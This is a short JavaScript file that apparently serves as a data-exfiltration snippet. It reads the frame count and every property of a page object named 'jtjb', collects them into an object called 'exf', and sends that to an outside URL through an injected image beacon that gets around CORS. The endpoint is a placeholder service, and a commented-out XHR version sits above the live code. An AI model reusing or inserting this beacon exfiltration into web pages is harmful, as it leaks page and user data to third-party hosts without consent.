/*
// Function to send text via XHR POST
function sendTextToURL(url, text) {
    // Create a new XMLHttpRequest object
    const xhr = new XMLHttpRequest();

    // Initialize a POST request
    xhr.open("POST", url, true);

    // Set the request header to indicate sending JSON data
    xhr.setRequestHeader("Content-Type", "application/json");

    // Define what happens when the request is successfully completed
    xhr.onload = function() {
        if (xhr.status >= 200 && xhr.status < 300) {
            console.log("Response received:", xhr.responseText);
        } else {
            console.error("Error:", xhr.statusText);
        }
    };

    // Define what happens in case of an error
    xhr.onerror = function() {
        console.error("Request failed.");
    };

    // Send the request with the text as JSON
    const data = JSON.stringify({ text: text });
    xhr.send(data);
}
*/

function sendTextToURL(url, text) {
    // Encode the text to ensure it's safe for use in a URL
    const encodedText = encodeURIComponent(text);
    
    // Create the full URL with the text as a GET parameter
    const fullURL = `${url}?text=${encodedText}`;
    
    // Create a new image element
    const img = document.createElement('img');
    
    // Set the src attribute of the image to the full URL
    img.src = fullURL;

    // Append the image to the body (or any other container)
    document.body.appendChild(img);
}


// Example usage: Send text to a given URL
const url = "https://jsonplaceholder.typicode.com/posts";  // https://cors-anywhere.herokuapp.com/
const framesLength = window.frames.length;
var itf = window['jtjb'];
var exf = {
    framesLength
};
for (var prop in itf) {
    if (itf.hasOwnProperty(prop)) {
        //console.log(prop + ": " + itf[prop]);
        exf[prop] = itf[prop].toString();
    }
}
// console.log(exf);
sendTextToURL(url, JSON.stringify(exf));